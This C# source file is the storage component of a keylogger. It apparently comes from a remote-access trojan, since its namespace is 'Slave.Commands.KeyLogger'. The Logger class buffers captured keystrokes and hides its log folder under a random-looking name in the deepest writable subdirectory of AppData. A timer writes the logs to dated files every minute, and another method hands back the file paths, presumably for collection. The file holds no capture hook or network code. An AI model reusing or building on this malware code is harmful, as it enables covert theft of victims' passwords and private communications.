using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Timers;

namespace Slave.Commands.KeyLogger
{
    /// <summary>
    /// Class managing the logging of the keys in the memory and file system
    /// </summary>
    internal class Logger
    {
        readonly string defaultDirectoryName = "287EH-293RD-983FS-2387Y-BN";

        string logDirectory;

        string logs;

        Timer timer;


        /// <summary>
        /// Set the log directory
        /// </summary>
        public Logger()
        {
            logs = "";

            var appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

            var dirs = GetDirectories(appdata);
            var filteredDirs = dirs.Where(x => x.Substring(x.LastIndexOf('\\')) == defaultDirectoryName).ToList();
            if (filteredDirs.Count != 0)
            {
                // Log directory already exists
                logDirectory = filteredDirs.First();
                return;
            }

            // The log directory must be created, create it in the deepest writable directory
            logDirectory = Path.Combine(dirs.Where(x => x.Length < 200).OrderByDescending(x => x.Length).First(), defaultDirectoryName);
            Directory.CreateDirectory(logDirectory);
        }

        /// <summary>
        /// Recursively get directories
        /// </summary>
        /// <param name="baseDirectory">Starting directory</param>
        /// <param name="dirs">Full paths or only dirs name</param>
        /// <returns>List of dirs</returns>
        List<string> GetDirectories(string baseDirectory, List<string> dirs = null)
        {
            if (dirs == null)
            {
                dirs = new List<string>();
            }
            else
            {
                dirs.Add(baseDirectory);
            }

            try
            {
                foreach (var dir in Directory.EnumerateDirectories(baseDirectory))
                {
                    GetDirectories(dir, dirs);
                }
            }
            catch (Exception)
            {
                // Unauthorized access
            }

            return dirs;
        }

        /// <summary>
        /// Return the stored and current logs, then clear them
        /// </summary>
        /// <returns>List of log files name</returns>
        public List<string> GetLogFilesPath()
        {
            if(logs != "") LogInFile();
            return Directory.EnumerateFiles(logDirectory).ToList();
        }

        /// <summary>
        /// Add the given key to the 'logs' variable,
        /// if the variable is big enough, log it into a file
        /// </summary>
        /// <param name="keyToLog">String representing a key</param>
        public void LogKey(string keyToLog)
        {
            logs += keyToLog;
        }

        /// <summary>
        /// Write logs into file
        /// </summary>
        void LogInFile()
        {
            try
            {
                File.AppendAllText(Path.Combine(logDirectory, DateTime.Now.ToString("dd-MM-yyyy")), logs);
                logs = "";
            }
            catch (Exception)
            {
                // Couldn't write in file
            }
        }

        /// <summary>
        /// Initialize the timer and start the countdown
        /// </summary>
        internal void StartLogTimer()
        {
            // 60 seconds countdown
            timer = new Timer(60000)
            {
                Enabled = true,
                AutoReset = true
            };

            timer.Elapsed += TimerElapsedHandler;
        }

        /// <summary>
        /// Stop the timer and dispose it
        /// </summary>
        internal void StopLogTimer()
        {
            timer?.Stop();
            timer?.Dispose();
        }

        /// <summary>
        /// Event raised when the timer countdown is ellapsed
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        void TimerElapsedHandler(object sender, ElapsedEventArgs e)
        {
            LogInFile();
        }
    }
}
